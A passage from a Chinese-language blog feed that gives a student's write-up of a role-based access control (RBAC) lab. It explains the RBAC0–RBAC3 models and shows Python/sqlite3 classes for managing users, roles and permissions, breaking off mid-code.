    
    
    <category term="Network Security" scheme="http://yoursite.com/tags/Network-Security/"/>
    
  </entry>
  
  <entry>
    <title>RBAC访问控制</title>
    <link href="http://yoursite.com/2020/11/27/RBAC%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6/"/>
    <id>http://yoursite.com/2020/11/27/RBAC%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6/</id>
    <published>2020-11-27T06:48:49.000Z</published>
    <updated>2020-11-29T12:47:44.539Z</updated>
    
    <content type="html"><![CDATA[<h1 id="RBAC访问控制实验"><a href="#RBAC访问控制实验" class="headerlink" title="RBAC访问控制实验"></a>RBAC访问控制实验</h1><h2 id="RBAC简介"><a href="#RBAC简介" class="headerlink" title="RBAC简介"></a>RBAC简介</h2><p>RBAC（Role-based Access Control）基于角色的访问控制模型，从根本上来讲是解决资源的控制的问题，而在这里所提出的解决方案是who、what以及how的解决方式，其中who是指权限的拥有者或者主体（user，role）而what就是资源或者对象，可以抽象为who对what进行来how操作</p><blockquote><p>RBAC其实是一种分析模型，主要分为：基本模型RBAC0（Core RBAC）、角色分层模型RBAC1（Hierarchal RBAC）、角色限制模型RBAC2（Constraint RBAC）和统一模型RBAC3（Combines RBAC）。</p></blockquote><h3 id="RBAC0"><a href="#RBAC0" class="headerlink" title="RBAC0"></a>RBAC0</h3><p>由四部分组成：用户、角色、会话和许可，</p><p><img src="/2020/11/27/RBAC%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6/1-1.PNG" srcset="/img/loading.gif" alt="1-1"></p><h3 id="RBAC1（角色分层模型）"><a href="#RBAC1（角色分层模型）" class="headerlink" title="RBAC1（角色分层模型）"></a>RBAC1（角色分层模型）</h3><p>在RBAC0的基础上引入了角色的继承，使得角色具有了上下级的关系，例如下图</p><p><img src="/2020/11/27/RBAC%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6/1-2.PNG" srcset="/img/loading.gif" alt="1-2"></p><p><img src="/2020/11/27/RBAC%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6/1-4.PNG" srcset="/img/loading.gif" alt="1-4"></p><h3 id="RBAC2（约束模型）"><a href="#RBAC2（约束模型）" class="headerlink" title="RBAC2（约束模型）"></a>RBAC2（约束模型）</h3><p>加入了约束的概念，并且引入了静态职责分离SSD(Static Separation of Duty)和动态职责分离DSD(Dynamic Separation of Duty)</p><blockquote><p><strong>SSD是用户和角色的指派阶段加入的，主要是对用户和角色有如下约束:</strong></p><ul><li>a、互斥角色：同一个用户在两个互斥角色中只能选择一个</li><li>b、基数约束：一个用户拥有的角色是有限的，一个角色拥有的许可也是有限的</li><li>c、先决条件约束：用户想要获得高级角色，首先必须拥有低级角色</li></ul><p><strong>DSD是会话和角色之间的约束，可以动态的约束用户拥有的角色，如一个用户可以拥有两个角色，但是运行时只能激活一个角色。</strong></p></blockquote><p><img src="/2020/11/27/RBAC%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6/1-3.PNG" srcset="/img/loading.gif" alt="1-3"></p><h3 id="RBAC3（RBAC1-RBAC2）"><a href="#RBAC3（RBAC1-RBAC2）" class="headerlink" title="RBAC3（RBAC1 + RBAC2）"></a>RBAC3（RBAC1 + RBAC2）</h3><p><img src="/2020/11/27/RBAC%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6/1-5.PNG" srcset="/img/loading.gif" alt="1-5"></p><h2 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h2><p>原始框架</p><p><img src="/2020/11/27/RBAC%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6/2-1.png" srcset="/img/loading.gif" alt="2-1"></p><h3 id="主体、角色、权限的定义以及相应配置"><a href="#主体、角色、权限的定义以及相应配置" class="headerlink" title="主体、角色、权限的定义以及相应配置"></a>主体、角色、权限的定义以及相应配置</h3><p>在这个例子当中，主体/用户是A、B、M1、C、D、M2以及BOSS，而相应的角色分为了第一类员工（A、B），部门经理（M1），第二类员工（C、D），经理（M2）以及BOSS，对应的权限就是读取，执行；读取、删除、执行；新建、读取、更改；新建、删除、读取、更改；所有权限</p><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>在运行的本文件的时候，<strong>管理员账户密码为1234</strong></p><p>其次，我参考了一些网上方法，采用的是数据库的格式，所以每次运行完的结果都会存在对应的db文件中，可以通过<strong>新建txt并且重新命名为datatable.db来重新初始化</strong></p><p>最后，由于是花了几天时间实现的，所以<strong>不同地方的注释和print出来的东西有中文有英文</strong>，但是都是自己验证通过的</p><h3 id="设计文档"><a href="#设计文档" class="headerlink" title="设计文档"></a>设计文档</h3><ul><li><p>设计思路：</p><p>  <img src="/2020/11/27/RBAC%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6/3-2.PNG" srcset="/img/loading.gif" alt="3-2"></p><p>  在这里我希望采用三个对象来对于用户、角色还有权限进行分别管理，同时，我才用了sqlite包来帮助实现对应的db文件中的几个表，而对于用户/角色/权限的一些操作，是通过这三个类里面的函数来进行实现的，下面来对不同的类进行分别解释</p></li><li><p><strong>对用户管理的类usermanager（）</strong></p><p>  包含的方法以及所要完成的功能/作用：</p><table><thead><tr><th align="center">函数</th><th align="center">函数的功能/作用</th></tr></thead><tbody><tr><td align="center">set_user_table（）</td><td align="center">初始化对应的user表，实现例子里面的内容</td></tr><tr><td align="center">set_user_role_table（）</td><td align="center">初始化对应的用户角色关联表</td></tr><tr><td align="center">add_user_role（）</td><td align="center">这是在添加用户的时候所需要用到的，要了解想要添加的用户的角色id</td></tr><tr><td align="center">user_info（）</td><td align="center">获取所要添加的用户的名称以及用户id</td></tr><tr><td align="center">add_user（）</td><td align="center">在用户表里面检索，符合要求时添加对应的表项</td></tr><tr><td align="center">user_name_show（）</td><td align="center">显示用户的信息的时候用到的</td></tr></tbody></table><p>  <strong>具体代码实现</strong></p>  <pre><code class="hljs python"><span class="hljs-keyword">import</span> sqlite3<span class="hljs-comment">#初始化对于用户管理的类</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">usermanager</span><span class="hljs-params">()</span>:</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self)</span>:</span>        super().__init__()    <span class="hljs-comment">#该方法用于设置对应的用户表</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">set_user_table</span><span class="hljs-params">(self)</span>:</span>        <span class="hljs-comment">#建立连接和游标对象</span>        con = sqlite3.connect(<span class="hljs-string">"d:/Information System Security/RBAC/datatable.db"</span>)        cur = con.cursor()        sql = <span class="hljs-string">'insert into user(user_name,user_id) values(?,?)'</span>        <span class="hljs-keyword">try</span>:            cur.executemany(sql,[(<span class="hljs-string">"员工A"</span>,<span class="hljs-number">1</span>),(<span class="hljs-string">"员工B"</span>,<span class="hljs-number">2</span>),(<span class="hljs-string">"员工C"</span>,<span class="hljs-number">3</span>),(<span class="hljs-string">"员工D"</span>,<span class="hljs-number">4</span>),(<span class="hljs-string">"部门经理M1"</span>,<span class="hljs-number">5</span>),(<span class="hljs-string">"部门经理M2"</span>,<span class="hljs-number">6</span>),(<span class="hljs-string">"Boss"</span>,<span class="hljs-number">7</span>)])            con.commit()            print(<span class="hljs-string">"用户表设置成功"</span>)        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:            print(e)            con.rollback()            print(<span class="hljs-string">"设置用户表失败"</span>)        <span class="hljs-keyword">finally</span>:            cur.close()            con.close()            <span class="hljs-comment">#该方法用于设置对应的用户角色关联表</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">set_user_role_table</span><span class="hljs-params">(self)</span>:</span>        con=sqlite3.connect(<span class="hljs-string">"d:/Information System Security/RBAC/datatable.db"</span>)        cur=con.cursor()        sql=<span class="hljs-string">'insert into user_role(user_id,role_id) values(?,?)'</span>        <span class="hljs-keyword">try</span>:            cur.executemany(sql,[(<span class="hljs-number">1</span>,<span class="hljs-number">101</span>),(<span class="hljs-number">2</span>,<span class="hljs-number">101</span>),(<span class="hljs-number">3</span>,<span class="hljs-number">201</span>),(<span class="hljs-number">4</span>,<span class="hljs-number">201</span>),(<span class="hljs-number">5</span>,<span class="hljs-number">100</span>),(<span class="hljs-number">6</span>,<span class="hljs-number">200</span>),(<span class="hljs-number">7</span>,<span class="hljs-number">404</span>)])            con.commit()            print(<span class="hljs-string">"用户角色关联表设置成功"</span>)        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:            print(e)            con.rollback()            print(<span class="hljs-string">"用户角色关联表设置失败"</span>)        <span class="hljs-keyword">finally</span>:            cur.close()            con.close()    <span class="hljs-comment">#该方法用于管理/增加用户角色关联表里面的内容</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add_user_role</span><span class="hljs-params">(self)</span>:</span>        print(<span class="hljs-string">"用户可以选择的角色:1.第一类员工2.第一类员工的经理3.第二类员工4.第二类员工经理5.老板"</span>)        user_type = int(input(<span class="hljs-string">"请输入用户对应的角色id:"</span>))        <span class="hljs-keyword">if</span> user_type == <span class="hljs-number">1</span>:            user_role = <span class="hljs-string">"第一类员工"</span>            role_id = <span class="hljs-number">101</span>            <span class="hljs-keyword">return</span> user_role,role_id        <span class="hljs-keyword">elif</span> user_type == <span class="hljs-number">2</span>:            user_role = <span class="hljs-string">"第一类员工的经理"</span>            role_id = <span class="hljs-number">100</span>            <span class="hljs-keyword">return</span> user_role,role_id        <span class="hljs-keyword">elif</span> user_type == <span class="hljs-number">3</span>:            user_role = <span class="hljs-string">"第二类员工"</span>            role_id = <span class="hljs-number">201</span>            <span class="hljs-keyword">return</span> user_role,role_id        <span class="hljs-keyword">elif</span> user_type == <span class="hljs-number">4</span>:            user_role = <span class="hljs-string">"第二类员工的经理"</span>            role_id = <span class="hljs-number">200</span>            <span class="hljs-keyword">return</span> user_role,role_id        <span class="hljs-keyword">elif</span> user_type == <span class="hljs-number">5</span>:            print(<span class="hljs-string">"无权限添加老板"</span>)            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>,<span class="hljs-literal">None</span>        <span class="hljs-keyword">else</span>:            print(<span class="hljs-string">"无法识别用户对应的角色id,请按照上面输入用户角色对应的数字"</span>)            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>,<span class="hljs-literal">None</span>        <span class="hljs-comment">#该方法用来展示输入要添加的用户的用户名以及对应你id</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">user_info</span><span class="hljs-params">(self)</span>:</span>        user_name=input(<span class="hljs-string">'请输入用户名：'</span>)        user_id=int(input(<span class="hljs-string">'请输入用户id:'</span> ))        <span class="hljs-keyword">return</span> user_name,user_id    <span class="hljs-comment">#该方法用来实现添加对应的用户</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add_user</span><span class="hljs-params">(self)</span>:</span>        (user_role,role_id)=self.add_user_role()        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> user_role <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> role_id :            print(<span class="hljs-string">"操作失败！"</span>)            <span class="hljs-keyword">return</span>        (user_name,user_id)=self.user_info()        con=sqlite3.connect(<span class="hljs-string">"d:/Information System Security/RBAC/datatable.db"</span>)        cur=con.cursor()        con.row_factory=sqlite3.Row        <span class="hljs-keyword">try</span>:            <span class="hljs-comment">#首先需要判断输入的用户名是否已经存在</span>            sql=<span class="hljs-string">'select *from user'</span>            cur.execute(sql)            <span class="hljs-comment">#判断输入的用户名是否在用户表当中</span>            exist = <span class="hljs-literal">False</span>            <span class="hljs-keyword">for</span> user <span class="hljs-keyword">in</span> cur:                <span class="hljs-keyword">if</span> user[<span class="hljs-number">1</span>] == user_name:                    exist = <span class="hljs-literal">True</span>                    <span class="hljs-comment">#此时，用户表中存在对应的用户</span>                    true_user_id=user[<span class="hljs-number">2</span>]                    true_role_id=<span class="hljs-literal">None</span>                    <span class="hljs-comment">#之后，从用户角色关联表当中查到对应的角色</span>                    sql1=<span class="hljs-string">'select *from user_role'</span>                    cur.execute(sql1)                    <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> cur:                        <span class="hljs-keyword">if</span> row[<span class="hljs-number">1</span>] == true_user_id:                            true_role_id = row[<span class="hljs-number">2</span>]                            <span class="hljs-comment">#此时，已经找到了在用户角色关联表当中的角色id</span>                    <span class="hljs-comment">#之后需要进行角色互斥，在这里面所有角色都为互斥，比如不可能既是老板又是员工，设定一个人只能拥有一个角色</span>                    <span class="hljs-keyword">if</span> role_id == true_role_id:                        print(<span class="hljs-string">"该用户已经存在这种角色"</span>)            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> exist:                <span class="hljs-comment">#如果不在用户表中，需要把新的用户以及用户id添加到用户表当中</span>                <span class="hljs-keyword">try</span>:                    sql = <span class="hljs-string">'insert into user(user_name,user_id) values(?,?)'</span>                    cur.execute(sql,(user_name,user_id))                    con.commit()                    print(<span class="hljs-string">"新增用户成功"</span>)                <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:                    print(e)                    con.rollback()                    print(<span class="hljs-string">"新增用户失败"</span>)                <span class="hljs-comment">#之后，我们需要根据add_user_role()得知想要添加的用户对应的角色id,加到用户角色关联表当中</span>                <span class="hljs-keyword">try</span>:                    sql1 = <span class="hljs-string">'insert into user_role(user_id,role_id) values(?,?)'</span>                    cur.execute(sql1,(user_id,role_id))                    con.commit()                    print(<span class="hljs-string">"新增用户角色关联条目成功"</span>)                <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:                    print(e)                    con.rollback()                    print(<span class="hljs-string">"新增用户角色关联条目失败"</span>)        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:            print(e)            print(<span class="hljs-string">"add_user()失败，请进行检查"</span>)        <span class="hljs-keyword">finally</span>:            cur.close()            con.close()        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">user_name_show</span><span class="hljs-params">(self)</span>:</span>        con = sqlite3.connect(<span class="hljs-string">"d:/Information System Security/RBAC/datatable.db"</span>)        cur=con.cursor()        con.row_factory=sqlite3.Row        sql=<span class="hljs-string">'select *from user'</span>        <span class="hljs-keyword">try</span>:            cur.execute(sql)            print(<span class="hljs-string">"显示用户信息"</span>)             user_list=[]            <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> cur:                user_list.append(row[<span class="hljs-number">1</span>])            print(user_list)        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:            print(e)            con.rollback()            print(<span class="hljs-string">"显示用户信息失败"</span>)        <span class="hljs-keyword">finally</span>:            cur.close()            con.close()</code></pre></li><li><p><strong>对权限进行管理的类rolemanager（）</strong></p><p>  包含的方法以及各自作用：</p><p>  首先明确在这个类里面，我们首先要实现把<strong>具体例子的角色表以及对应的角色权限关联表初始化</strong>，其次要完成的是<strong>基于角色的权限的修改</strong>，<strong>在这里我是进行来一个限制，不能让一些角色通过提升或者删除权限来变成了另一个角色</strong>，最后的话是<strong>用来展示当前角色表信息的函数</strong></p><ul><li>对于角色表以及对应的角色权限关联表初始化的函数</li></ul></li></ul><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">set_role_table</span><span class="hljs-params">(self)</span>:</span>        <span class="hljs-comment">#set the connection to the db file</span>        con = sqlite3.connect(<span class="hljs-string">"d:/Information System Security/RBAC/datatable.db"</span>)        cur = con.cursor()        <span class="hljs-comment">#creat the table</span>        sql = <span class="hljs-string">'insert into role(role_name, role_id) values(?,?)'</span>        <span class="hljs-comment">#execute</span>        <span class="hljs-keyword">try</span>:            cur.executemany(sql,[(<span class="hljs-string">"第一类员工的经理"</span>,<span class="hljs-number">100</span>),(<span class="hljs-string">"第一类员工"</span>,<span class="hljs-number">101</span>),(<span class="hljs-string">"第二类员工的经理"</span>,<span class="hljs-number">200</span>),(<span class="hljs-string">"第二类员工"</span>,<span class="hljs-number">201</span>),(<span class="hljs-string">"Boss"</span>,<span class="hljs-number">404</span>)])            <span class="hljs-comment">#commitment</span>            con.commit()            print(<span class="hljs-string">"设置角色成功"</span>)        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:            print(e)            con.rollback()            print(<span class="hljs-string">"设置角色失败"</span>)        <span class="hljs-keyword">finally</span>:            <span class="hljs-comment">#close the connect</span>            cur.close()            con.close()            <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">set_role_permission_table</span><span class="hljs-params">(self)</span>:</span><span class="hljs-comment">#设置对应的角色权限关联表</span>        con = sqlite3.connect(<span class="hljs-string">"d:/Information System Security/RBAC/datatable.db"</span>)        cur = con.cursor()        sql=<span class="hljs-string">'insert into role_permission(role_id,permission_id) values(?,?)'</span>        <span class="hljs-keyword">try</span>:            cur.executemany(sql,[(<span class="hljs-number">101</span>,<span class="hljs-number">1002</span>),(<span class="hljs-number">101</span>,<span class="hljs-number">1003</span>),(<span class="hljs-number">100</span>,<span class="hljs-number">1002</span>),(<span class="hljs-number">100</span>,<span class="hljs-number">1003</span>),(<span class="hljs-number">100</span>,<span class="hljs-number">1005</span>),(<span class="hljs-number">201</span>,<span class="hljs-number">1001</span>),(<span class="hljs-number">201</span>,<span class="hljs-number">1002</span>),(<span class="hljs-number">201</span>,<span class="hljs-number">1004</span>),(<span class="hljs-number">200</span>,<span class="hljs-number">1001</span>),(<span class="hljs-number">200</span>,<span class="hljs-number">1002</span>),(<span class="hljs-number">200</span>,<span class="hljs-number">1004</span>),(<span class="hljs-number">200</span>,<span class="hljs-number">1005</span>),(<span class="hljs-number">404</span>,<span class="hljs-number">1001</span>),(<span class="hljs-number">404</span>,<span class="hljs-number">1002</span>),(<span class="hljs-number">404</span>,<span class="hljs-number">1003</span>),(<span class="hljs-number">404</span>,<span class="hljs-number">1004</span>),(<span class="hljs-number">404</span>,<span class="hljs-number">1005</span>)])            con.commit()            print(<span class="hljs-string">"角色权限关联表设置成功"</span>)        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:            print(e)            con.rollback()            print(<span class="hljs-string">"角色权限关联表设置失败"</span>)        <span class="hljs-keyword">finally</span>:            cur.close()            con.close()</code></pre><ul><li>之后是对于权限的修改的函数，增加权限的时候要先判断该角色是否已经有了这个权限，二在删除的时候也应该先看是否具有这个权限，同时不能因为权限改变而改变身份，比如一类员工不能增加权限5，否则会变成第一类员工的经理</li></ul><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">modify_permission</span><span class="hljs-params">(self)</span>:</span>        <span class="hljs-comment">#set the connection to the db file</span>        con = sqlite3.connect(<span class="hljs-string">"d:/Information System Security/RBAC/datatable.db"</span>)        cur = con.cursor()        <span class="hljs-comment">#we need to modify the seperate data row, achieve this by using row</span>        print(<span class="hljs-string">"here is the id and the name:第一类员工:101   第一类员工的经理:100    第二类员工:201    第二类员工的经理:200    Boss:404"</span>)        con.row_factory = sqlite3.Row        print(<span class="hljs-string">"do not modify the Boss's permission!!!"</span>)        role_id = int(input(<span class="hljs-string">"请输入您要修改权限的角色对应的角色id:"</span>))        addel = int(input(<span class="hljs-string">"对该角色增加权限请输入1,删除权限请输入2:"</span>))        print(<span class="hljs-string">"所有可以增加或删除的权限:1001:新建  1002:读取  1003:执行  1004:更改  1005:删除"</span>)                <span class="hljs-keyword">if</span> addel == <span class="hljs-number">1</span>:<span class="hljs-comment">#when it comes to add permission</span>            permission = int(input(<span class="hljs-string">"请输入要增加权限的对应数字:"</span>))            <span class="hljs-comment">#then we need to check weather the permission is already exist</span>            exist = <span class="hljs-literal">False</span>            <span class="hljs-comment">#we need to check the permission that the role already have</span>            permissionlist = []            <span class="hljs-comment">#we need to check the role_permission table</span>            sql = <span class="hljs-string">'select *from role_permission'</span>            cur.execute(sql)            <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> cur:                <span class="hljs-keyword">if</span> row[<span class="hljs-number">1</span>] == role_id:                    permissionlist.append(row[<span class="hljs-number">2</span>])                    <span class="hljs-keyword">if</span> row[<span class="hljs-number">2</span>] == permission:                        exist = <span class="hljs-literal">True</span>                        print(<span class="hljs-string">"该角色已经有了输入的permission id对应的权限,不需要进行增加"</span>)            <span class="hljs-comment">#if the permission is not exist, add the permission to the role</span>            <span class="hljs-keyword">if</span> exist == <span class="hljs-literal">False</span>:                <span class="hljs-comment">#之后我们需要实现对于权限的控制，不能是因为提升权限而变成了另一个角色</span>                result = <span class="hljs-literal">False</span>                <span class="hljs-keyword">if</span> role_id == <span class="hljs-number">101</span>:                    <span class="hljs-keyword">if</span> permission == <span class="hljs-number">1005</span>:                        result = <span class="hljs-literal">True</span>                        print(<span class="hljs-string">"增加权限失败，因为第一类员工不能增加权限5，否则会变成第一类员工的经理"</span>)                        cur.close()                        con.close()                <span class="hljs-keyword">if</span> role_id == <span class="hljs-number">201</span>:                    <span class="hljs-keyword">if</span> permission == <span class="hljs-number">1005</span>:                        result = <span class="hljs-literal">True</span>                        print(<span class="hljs-string">"增加权限失败，因为第二类员工不能增加权限5，否则会变成第二类员工的经理"</span>)                        cur.close()                        con.close()                <span class="hljs-keyword">if</span> role_id == <span class="hljs-number">200</span>:                    <span class="hljs-keyword">if</span> permission == <span class="hljs-number">1003</span>:                        result = <span class="hljs-literal">True</span>                        print(<span class="hljs-string">"增加权限失败，因为第二类员工的经理不能增加权限3，否则会变成Boss"</span>)                        cur.close()                        con.close()                <span class="hljs-keyword">if</span> role_id == <span class="hljs-number">404</span>:                    result = <span class="hljs-literal">True</span>                    print(<span class="hljs-string">"Boss拥有所有权限，无法提升"</span>)                    cur.close()                    con.close()                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> result:                    <span class="hljs-keyword">try</span>:                        sql1 = <span class="hljs-string">'insert into role_permission(role_id,permission_id) values(?,?)'</span>                        cur.execute(sql1,(role_id,permission))                        con.commit()                        print(<span class="hljs-string">"增加权限成功"</span>)                    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:                        print(e)                        con.rollback()                        print(<span class="hljs-string">"增加权限失败，请进行检查"</span>)                    <span class="hljs-keyword">finally</span>:                        cur.close()                        con.close()        <span class="hljs-keyword">if</span> addel == <span class="hljs-number">2</span>:<span class="hljs-comment">#当要删除权限的时候</span>            permission = int(input(<span class="hljs-string">"请输入要删除权限的对应数字:"</span>))            exist = <span class="hljs-literal">False</span>            sql = <span class="hljs-string">'select *from role_permission'</span>            permissionlist = []            cur.execute(sql)            <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> cur:                <span class="hljs-keyword">if</span> row[<span class="hljs-number">1</span>]==role_id:                    permissionlist.append(row[<span class="hljs-number">2</span>])                    <span class="hljs-keyword">if</span> row[<span class="hljs-number">2</span>] == permission:                        exist = <span class="hljs-literal">True</span>                        print(<span class="hljs-string">"检查通过，该角色拥有对应的权限，可以进行权限的删除"</span>)                        result = <span class="hljs-literal">False</span>                        <span class="hljs-keyword">if</span> role_id == <span class="hljs-number">100</span>:                            <span class="hljs-keyword">if</span> permission == <span class="hljs-number">1005</span>:                                result = <span class="hljs-literal">True</span>                                print(<span class="hljs-string">"删除权限失败，因为第一类员工的经理不能删除权限5，否则会变成第一类员工"</span>)                                cur.close()                                con.close()                        <span class="hljs-keyword">if</span> role_id == <span class="hljs-number">200</span>:                            <span class="hljs-keyword">if</span> permission == <span class="hljs-number">1005</span>:                                result = <span class="hljs-literal">True</span>                                print(<span class="hljs-string">"删除权限失败，因为第二类员工的经理不能删除权限5，否则会变成第二类员工"</span>)                                cur.close()                                con.close()                        <span class="hljs-keyword">if</span> role_id == <span class="hljs-number">404</span>:                            print(<span class="hljs-string">"Boss拥有所有权限，不能删除Boss权限"</span>)                            cur.close()                            con.close()                        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> result:                            <span class="hljs-keyword">try</span>:                                sql1=<span class="hljs-string">'delete from role_permission where pno=?'</span>                                cur.execute(sql1,(row[<span class="hljs-number">0</span>],))                                con.commit()                                print(<span class="hljs-string">"删除权限成功"</span>)                            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:                                print(e)                                con.rollback()                                print(<span class="hljs-string">"删除权限失败"</span>)                            <span class="hljs-keyword">finally</span>:                                cur.close()                                con.close()                                <span class="hljs-keyword">break</span>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> exist:                print(<span class="hljs-string">"没有此权限"</span>)                cur.close()                  con.close()</code></pre><p>至于用来展示的role_show（）函数，和前面类的展示函数并没有什么区别</p><ul><li><p>对于权限管理的类permissionmanager（）</p><p>  在这里重要的也就是对于权限表的管理，其他的调整关联表的函数上面已经实现</p></li></ul><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">permissionmanager</span><span class="hljs-params">()</span>:</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self)</span>:</span>        super().__init__()        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">permission_show</span><span class="hljs-params">(self)</span>:</span>        con=sqlite3.connect(<span class="hljs-string">"d:/Information System Security/RBAC/datatable.db"</span>)        cur=con.cursor()        sql=<span class="hljs-string">'select *from permission'</span>        print(<span class="hljs-string">'权限及权限id:'</span>)        <span class="hljs-keyword">try</span>:            cur.execute(sql)            <span class="hljs-keyword">for</span> permission <span class="hljs-keyword">in</span> cur:                print(permission)        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:            print(e)            con.rollback()            print(<span class="hljs-string">"显示权限信息失败"</span>)        <span class="hljs-keyword">finally</span>:            cur.close()            con.close()    <span class="hljs-comment">#设置对应的表</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">set_permission_table</span><span class="hljs-params">(self)</span>:</span>        con=sqlite3.connect(<span class="hljs-string">"d:/Information System Security/RBAC/datatable.db"</span>)        cur=con.cursor()        sql=<span class="hljs-string">'insert into permission(permission_name,permission_id) values(?,?)'</span>        <span class="hljs-keyword">try</span>:            cur.executemany(sql,[(<span class="hljs-string">'新建'</span>,<span class="hljs-number">1001</span>),(<span class="hljs-string">'读取'</span>,<span class="hljs-number">1002</span>),(<span class="hljs-string">'执行'</span>,<span class="hljs-number">1003</span>),(<span class="hljs-string">'更改'</span>,<span class="hljs-number">1004</span>),(<span class="hljs-string">'删除'</span>,<span class="hljs-number">1005</span>)])            con.commit()            print(<span class="hljs-string">'权限表设置成功'</span>)        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:            print(e)            con.rollback()            print(<span class="hljs-string">'权限表设置失败'</span>)        <span class="hljs-keyword">finally</span>:            cur.close()            con.close()</code></pre><p>最后是调用并且实例化上面类的主函数/文件main.py</p><p>在这里面主要是mian函数来调用其他类里面的方法，还有就是通过user_list（）以及check（）方法来访问用户表以及查询用户有没有对应的一些权限，以及最开始建立5个表的格式</p><p>在这里只贴出部分代码，具体的可以看py文件</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">user_list</span><span class="hljs-params">()</span>:</span>    con = sqlite3.connect(<span class="hljs-string">"datatable.db"</span>)    cur = con.cursor()    con.row_factory=sqlite3.Row    sql=<span class="hljs-string">'select *from user'</span>    <span class="hljs-comment">#进行查找</span>    <span class="hljs-keyword">try</span>:        cur.execute(sql)        <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> cur:            print(row[<span class="hljs-number">0</span>],row[<span class="hljs-number">1</span>],row[<span class="hljs-number">2</span>])    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:        print(e)        con.rollback()        print(<span class="hljs-string">'查询用户失败'</span>)    <span class="hljs-keyword">finally</span>:        cur.close()        con.close()        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check</span><span class="hljs-params">(username, permission)</span>:</span>    user_id = <span class="hljs-literal">None</span>    permission_id = <span class="hljs-literal">None</span>    role_id = <span class="hljs-literal">None</span>    permission_list = []    result = <span class="hljs-literal">False</span> <span class="hljs-comment">#判断是否存在</span>    con=sqlite3.connect(<span class="hljs-string">"datatable.db"</span>)    cur=con.cursor()    con.row_factory=sqlite3.Row    <span class="hljs-comment">#首先先查找对应的user_id</span>    <span class="hljs-keyword">try</span>:        sql=<span class="hljs-string">'select *from user'</span>        cur.execute(sql)        <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> cur:            <span class="hljs-keyword">if</span> username == row[<span class="hljs-number">1</span>]:                <span class="hljs-comment">#找到对应的user_id</span>                result = <span class="hljs-literal">True</span>                user_id = row[<span class="hljs-number">2</span>]        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> result:            print(<span class="hljs-string">"没有查到该username对应的user_id,请检查后再进行查询"</span>)    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:        print(e)        con.rollback()        print(<span class="hljs-string">'check():user_id查询失败,请检查code'</span>)            <span class="hljs-comment">#之后来查询对应的role_id</span>    <span class="hljs-keyword">try</span>:        sql=<span class="hljs-string">'select *from user_role'</span>        cur.execute(sql)        <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> cur:            <span class="hljs-keyword">if</span> user_id == row[<span class="hljs-number">1</span>]:                role_id = row[<span class="hljs-number">2</span>]    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:        print(e)        con.rollback()        print(<span class="hljs-string">"check():role_id查询失败,请检查code"</span>)        <span class="hljs-comment">#之后查找所拥有的权限</span>    <span class="hljs-keyword">try</span>:        sql=<span 